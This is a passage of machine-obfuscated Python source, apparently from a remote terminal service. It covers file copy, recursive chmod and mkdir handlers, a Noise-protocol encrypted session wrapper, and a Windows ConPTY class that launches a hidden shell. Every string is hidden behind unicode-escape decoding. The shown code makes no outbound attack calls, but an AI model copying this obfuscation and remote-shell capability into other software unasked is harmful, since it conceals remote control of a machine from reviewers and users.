                self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_279) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_280), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_278.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_279, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_280, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_278.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_279, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_280, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_283 = sum((1 for O0_var_284 in O0_var_278 if O0_var_284[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_277.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_277), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_283})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_283 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_277), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_283, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_278}

    def _parse_mode(self, O0_var_285: str) -> int:
        O0_var_285 = O0_var_285.strip()
        if O0_var_285.isdigit() or (O0_var_285.startswith(codecs.decode('\\u0030', 'unicode_escape')) and O0_var_285[1:].isdigit()):
            return int(O0_var_285, 8)
        if len(O0_var_285) == 9 and all((O0_var_286 in codecs.decode('\\u0072\\u0077\\u0078\\u0053\\u0074\\u0054\\u002d', 'unicode_escape') for O0_var_286 in O0_var_285)):
            O0_var_287 = 0
            O0_var_288 = {codecs.decode('\\u0072', 'unicode_escape'): 4, codecs.decode('\\u0077', 'unicode_escape'): 2, codecs.decode('\\u0078', 'unicode_escape'): 1, codecs.decode('\\u0053', 'unicode_escape'): 0, codecs.decode('\\u0073', 'unicode_escape'): 1, codecs.decode('\\u0054', 'unicode_escape'): 0, codecs.decode('\\u0074', 'unicode_escape'): 1, codecs.decode('\\u002d', 'unicode_escape'): 0}
            for O0_var_289, O0_var_290 in enumerate(O0_var_285):
                if O0_var_290 in O0_var_288:
                    O0_var_291 = 2 - O0_var_289 % 3
                    O0_var_287 |= O0_var_288[O0_var_290] << 6 - O0_var_289 // 3 * 3 + O0_var_291
            return O0_var_287
        if any((O0_var_292 in O0_var_285 for O0_var_292 in [codecs.decode('\\u003d', 'unicode_escape'), codecs.decode('\\u002b', 'unicode_escape'), codecs.decode('\\u002d', 'unicode_escape')])) and any((O0_var_293 in O0_var_285 for O0_var_293 in [codecs.decode('\\u0075', 'unicode_escape'), codecs.decode('\\u0067', 'unicode_escape'), codecs.decode('\\u006f', 'unicode_escape'), codecs.decode('\\u0061', 'unicode_escape')])):
            raise ValueError(codecs.decode('\\u0053\\u0079\\u006d\\u0062\\u006f\\u006c\\u0069\\u0063\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0027', 'unicode_escape') + str(O0_var_285) + codecs.decode('\\u0027\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u0075\\u006c\\u006c\\u0079\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0079\\u0065\\u0074\\u002c\\u0020\\u0075\\u0073\\u0065\\u0020\\u006f\\u0063\\u0074\\u0061\\u006c\\u0020\\u006c\\u0069\\u006b\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027', 'unicode_escape'))
        raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_285) + codecs.decode('\\u0027\\u002e\\u0020\\u0055\\u0073\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027\\u002c\\u0020\\u0027\\u0030\\u0036\\u0034\\u0034\\u0027\\u002c\\u0020\\u006f\\u0072\\u0020\\u0027\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u0027', 'unicode_escape'))

    def set_authority(self, O0_var_294: Dict[str, str], recursive: bool=False) -> dict:
        O0_var_295 = []
        for O0_var_296, O0_var_297 in O0_var_294.items():
            try:
                O0_var_298 = self._safe_path(O0_var_296)
                if not O0_var_298.exists():
                    O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_296, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_299 = self._parse_mode(O0_var_297)
                if recursive and O0_var_298.is_dir():
                    for O0_var_300, O0_var_301, O0_var_302 in os.walk(O0_var_298):
                        os.chmod(O0_var_300, O0_var_299)
                        for O0_var_303 in O0_var_301:
                            os.chmod(os.path.join(O0_var_300, O0_var_303), O0_var_299)
                        for O0_var_304 in O0_var_302:
                            os.chmod(os.path.join(O0_var_300, O0_var_304), O0_var_299)
                else:
                    os.chmod(O0_var_298, O0_var_299)
                O0_var_305 = stat.filemode(O0_var_298.stat().st_mode)
                O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_298.relative_to(self.O0_fn_57)), codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_297, codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064', 'unicode_escape'): O0_var_305, codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_298.stat().st_mode)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u0068\\u006d\\u006f\\u0064', 'unicode_escape'), O0_var_296, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_297, codecs.decode('\\u0072\\u0065\\u0063\\u0075\\u0072\\u0073\\u0069\\u0076\\u0065', 'unicode_escape'): recursive})
            except HTTPException as e:
                O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_296, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except ValueError as e:
                O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_296, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
            except PermissionError:
                O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_296, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape')})
            except Exception as e:
                O0_var_295.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_296, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(e)})
        O0_var_306 = sum((1 for O0_var_307 in O0_var_295 if O0_var_307[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_306 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_294), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_306, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_295}

    def create_directory(self, O0_var_308: str) -> dict:
        O0_var_309 = self._safe_path(O0_var_308)
        if O0_var_309.exists():
            raise HTTPException(409, codecs.decode('\\u0045\\u0078\\u0069\\u0073\\u0074\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_308))
        try:
            O0_var_309.mkdir(parents=True)
            self._audit(codecs.decode('\\u006d\\u006b\\u0064\\u0069\\u0072', 'unicode_escape'), str(O0_var_309), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_309.relative_to(self.O0_fn_57))}
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u004d\\u006b\\u0064\\u0069\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))

class NoiseSessionWrapper:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u5c01\\u88c5\\u7c7b\\u0020\\u0028\\u9ed1\\u76d2\\u72b6\\u6001\\u673a\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e1a\\u52a1\\u5c42\\u65e0\\u9700\\u5173\\u5fc3\\u5e95\\u5c42\\u7684\\u63e1\\u624b\\u7ec6\\u8282\\uff0c\\u76f4\\u63a5\\u8c03\\u7528\\u5bf9\\u5e94\\u65b9\\u6cd5\\u5373\\u53ef\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, is_initiator: bool, local_priv_b64: str, expected_remote_pub_b64: str=None):
        self.noise = NoiseConnection.from_name(b'Noise_XX_25519_ChaChaPoly_BLAKE2s')
        if is_initiator:
            self.noise.set_as_initiator()
        else:
            self.noise.set_as_responder()
        if local_priv_b64:
            O0_var_310 = base64.b64decode(local_priv_b64)
            self.noise.set_keypair_from_private_bytes(Keypair.STATIC, O0_var_310)
        if expected_remote_pub_b64:
            O0_var_311 = base64.b64decode(expected_remote_pub_b64)
            self.noise.set_keypair_from_public_bytes(Keypair.REMOTE_STATIC, O0_var_311)
            self.expected_remote_pub = O0_var_311
        else:
            self.expected_remote_pub = None
        self.captured_remote_pub: Optional[bytes] = None
        self.noise.set_prologue(b'kisama_terminal_v1')
        self.noise.start_handshake()

    @property
    def is_established(self) -> bool:
        return self.noise.handshake_finished

    def process_handshake(self, O0_var_312: bytes) -> bytes:
        if O0_var_312:
            self._read_message_capture_rs(O0_var_312)
        if not self.noise.handshake_finished:
            return self.noise.write_message(b'')
        else:
            return b''

    def _read_message_capture_rs(self, O0_var_313: bytes) -> None:
        O0_var_314 = self.noise.noise_protocol
        O0_var_315 = O0_var_314.keypair_class
        O0_var_316: Dict[str, bytes] = {}

        class _CapturingKeyPair(O0_var_315):

            @classmethod
            def from_public_bytes(cls, data):
                O0_var_316[codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape')] = bytes(data)
                return super().from_public_bytes(data)
        O0_var_314.keypair_class = _CapturingKeyPair
        try:
            self.noise.read_message(O0_var_313)
        finally:
            if hasattr(O0_var_314, codecs.decode('\\u006b\\u0065\\u0079\\u0070\\u0061\\u0069\\u0072\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073', 'unicode_escape')):
                O0_var_314.keypair_class = O0_var_315
        self.captured_remote_pub = O0_var_316.get(codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape'))

    def encrypt(self, O0_var_317: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u52a0\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.encrypt(O0_var_317)

    def decrypt(self, O0_var_318: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u89e3\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.decrypt(O0_var_318)
_IS_WINDOWS = os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape')
if _IS_WINDOWS:
    import ctypes
    import msvcrt
    from ctypes import wintypes
    _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 131094
    _EXTENDED_STARTUPINFO_PRESENT = 524288
    _CREATE_UNICODE_ENVIRONMENT = 1024
    _CREATE_NO_WINDOW_FLAG = getattr(subprocess, codecs.decode('\\u0043\\u0052\\u0045\\u0041\\u0054\\u0045\\u005f\\u004e\\u004f\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), 0)
    _STARTF_USESTDHANDLES = 256

    class _COORD(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0058', 'unicode_escape'), ctypes.c_short), (codecs.decode('\\u0059', 'unicode_escape'), ctypes.c_short)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0068\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0064\\u0077\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD)]

    class _STARTUPINFOEX(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0063\\u0062', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0044\\u0065\\u0073\\u006b\\u0074\\u006f\\u0070', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0054\\u0069\\u0074\\u006c\\u0065', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u0064\\u0077\\u0058', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u0069\\u006c\\u006c\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u006c\\u0061\\u0067\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0077\\u0053\\u0068\\u006f\\u0077\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u0063\\u0062\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), ctypes.c_void_p), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0049\\u006e\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0045\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u006c\\u0070\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), ctypes.c_void_p)]

    def _probe_conpty():
        try:
            O0_var_319 = ctypes.WinDLL(codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u0033\\u0032', 'unicode_escape'), use_last_error=True)
        except Exception:
            return None
        for O0_var_320 in (codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0052\\u0065\\u0073\\u0069\\u007a\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0043\\u006c\\u006f\\u0073\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape')):
            if not hasattr(O0_var_319, O0_var_320):
                return None
        O0_var_319.CreatePseudoConsole.restype = ctypes.c_long
        O0_var_319.CreatePseudoConsole.argtypes = [_COORD, wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        O0_var_319.ResizePseudoConsole.restype = ctypes.c_long
        O0_var_319.ResizePseudoConsole.argtypes = [wintypes.HANDLE, _COORD]
        O0_var_319.ClosePseudoConsole.restype = None
        O0_var_319.ClosePseudoConsole.argtypes = [wintypes.HANDLE]
        O0_var_319.InitializeProcThreadAttributeList.restype = wintypes.BOOL
        O0_var_319.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_319.UpdateProcThreadAttribute.restype = wintypes.BOOL
        O0_var_319.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_319.DeleteProcThreadAttributeList.restype = None
        O0_var_319.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
        O0_var_319.CreateProcessW.restype = wintypes.BOOL
        O0_var_319.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(_STARTUPINFOEX), ctypes.POINTER(_PROCESS_INFORMATION)]
        O0_var_319.CloseHandle.restype = wintypes.BOOL
        O0_var_319.CloseHandle.argtypes = [wintypes.HANDLE]
        return O0_var_319
    _KERNEL32 = _probe_conpty()

    def _windows_env_block(env: Dict[str, str]):
        O0_var_321 = codecs.decode('\\u0000', 'unicode_escape').join((str(O0_var_322) + codecs.decode('\\u003d', 'unicode_escape') + str(O0_var_323) for O0_var_322, O0_var_323 in env.items())) + codecs.decode('\\u0000', 'unicode_escape')
        return ctypes.create_unicode_buffer(O0_var_321)

    def _taskkill(O0_var_324: int):
        if not O0_var_324:
            return
        try:
            subprocess.run([codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u006b\\u0069\\u006c\\u006c', 'unicode_escape'), codecs.decode('\\u002f\\u0046', 'unicode_escape'), codecs.decode('\\u002f\\u0054', 'unicode_escape'), codecs.decode('\\u002f\\u0050\\u0049\\u0044', 'unicode_escape'), str(O0_var_324)], creationflags=_CREATE_NO_WINDOW_FLAG, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass

    class _ConPtyTerminal:
        codecs.decode('\\u57fa\\u4e8e\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0020\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u0028\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u0020\\u7684\\u771f\\u5b9e\\u7ec8\\u7aef\\u5b9e\\u73b0', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_325: int, O0_var_326: int, cwd: str=None):
            self.shell = shell
            self.env = env
            self.rows = O0_var_325
            self.cols = O0_var_326
            self.cwd = cwd
            self._hpc = None
            self._attr_list = None
            self._in_r = self._in_w = None
            self._out_r = self._out_w = None
            self._h_process = None
            self.pid = 0

        def start(self):
            if _KERNEL32 is None:
                raise RuntimeError(codecs.decode('\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0020\\u4e0d\\u53ef\\u7528', 'unicode_escape'))
            O0_var_327, O0_var_328 = os.pipe()
            O0_var_329, O0_var_330 = os.pipe()
            try:
                O0_var_331 = msvcrt.get_osfhandle(O0_var_327)
                O0_var_332 = msvcrt.get_osfhandle(O0_var_330)
                O0_var_333 = wintypes.HANDLE()
                O0_var_334 = _KERNEL32.CreatePseudoConsole(_COORD(self.cols, self.rows), O0_var_331, O0_var_332, 0, ctypes.byref(O0_var_333))
                if O0_var_334 != 0:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u5931\\u8d25\\u0020\\u0028\\u0048\\u0052\\u0045\\u0053\\u0055\\u004c\\u0054\\u003d\\u0030\\u0078', 'unicode_escape') + format(O0_var_334 & 4294967295, codecs.decode('\\u0078', 'unicode_escape')) + codecs.decode('\\u0029', 'unicode_escape'))
                self._hpc = O0_var_333.value
                self._in_r, self._in_w = (O0_var_327, O0_var_328)
                self._out_r, self._out_w = (O0_var_329, O0_var_330)
                os.set_blocking(self._out_r, False)
                O0_var_335 = codecs.decode('\\u0022', 'unicode_escape') + str(self.shell) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in self.shell else self.shell
                O0_var_336 = _windows_env_block(self.env)
                O0_var_337 = _STARTUPINFOEX()
                O0_var_337.cb = ctypes.sizeof(_STARTUPINFOEX)
                O0_var_337.dwFlags = _STARTF_USESTDHANDLES
                O0_var_338 = ctypes.c_size_t(0)
                _KERNEL32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(O0_var_338))
                O0_var_339 = ctypes.create_string_buffer(O0_var_338.value)
                if not _KERNEL32.InitializeProcThreadAttributeList(O0_var_339, 1, 0, ctypes.byref(O0_var_338)):
                    raise OSError(codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                if not _KERNEL32.UpdateProcThreadAttribute(O0_var_339, 0, _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, self._hpc, ctypes.sizeof(wintypes.HANDLE), None, None):
                    raise OSError(codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._attr_list = O0_var_339
                O0_var_337.lpAttributeList = ctypes.cast(O0_var_339, ctypes.c_void_p)
                O0_var_340 = _PROCESS_INFORMATION()
                O0_var_341 = _EXTENDED_STARTUPINFO_PRESENT | _CREATE_UNICODE_ENVIRONMENT
                O0_var_342 = _KERNEL32.CreateProcessW(None, O0_var_335, None, None, False, O0_var_341, ctypes.cast(O0_var_336, ctypes.c_void_p), self.cwd, ctypes.byref(O0_var_337), ctypes.byref(O0_var_340))
                if not O0_var_342:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0057\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._h_process = O0_var_340.hProcess
                self.pid = O0_var_340.dwProcessId
                if O0_var_340.hThread:
                    _KERNEL32.CloseHandle(O0_var_340.hThread)
            except Exception:
                self.close()
                raise

        def set_size(self, O0_var_343: int, O0_var_344: int):
            if self._hpc is None or _KERNEL32 is None:
                return
            try:
                _KERNEL32.ResizePseudoConsole(self._hpc, _COORD(O0_var_344, O0_var_343))
            except Exception:
                pass

        def read(self, O0_var_345: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_345)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            if self._hpc is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.ClosePseudoConsole(self._hpc)
                except Exception:
                    pass
                self._hpc = None
            if self._attr_list is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.DeleteProcThreadAttributeList(self._attr_list)
                except Exception:
                    pass
                self._attr_list = None
            if self._h_process is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.CloseHandle(self._h_process)
                except Exception:
                    pass
                self._h_process = None
            for O0_var_346 in (self._in_r, self._in_w, self._out_r, self._out_w):
